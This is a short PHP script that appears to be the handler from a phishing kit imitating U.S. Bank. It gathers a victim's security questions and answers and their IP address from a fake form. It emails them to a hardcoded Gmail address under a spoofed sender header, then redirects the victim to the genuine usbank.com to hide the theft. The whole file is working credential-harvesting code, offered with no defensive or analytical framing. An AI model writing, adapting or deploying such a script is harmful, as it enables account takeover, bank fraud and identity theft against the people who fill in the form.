<?
$ip = getenv("REMOTE_ADDR");
$message .= "--------------US Info-----------------------\n";
$message .= "Q1: ".$_POST['formselect4']."\n";
$message .= "A1   : ".$_POST['formtext2']."\n";
$message .= "Q2 : ".$_POST['formselect5']."\n";
$message .= "A2 : ".$_POST['formtext4']."\n";
$message .= "Q3            : ".$_POST['formselect6']."\n";
$message .= "A3            : ".$_POST['formtext6']."\n";
$message .= "Q4            : ".$_POST['formselect7']."\n";
$message .= "A4           : ".$_POST['formtext8']."\n";
$message .= "Q5            : ".$_POST['formselect8']."\n";
$message .= "A5          : ".$_POST['formtext1']."\n";
$message .= "IP                     : ".$ip."\n";
$message .= "---------------Created BY unknown-------------\n";
$send = "donaldyates1961@gmail.com";
$subject = "Result from Unknown";
$headers = "From: US<customer-support@Spammers>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}

	
		   header("Location: https://www.usbank.com/index.html");
?>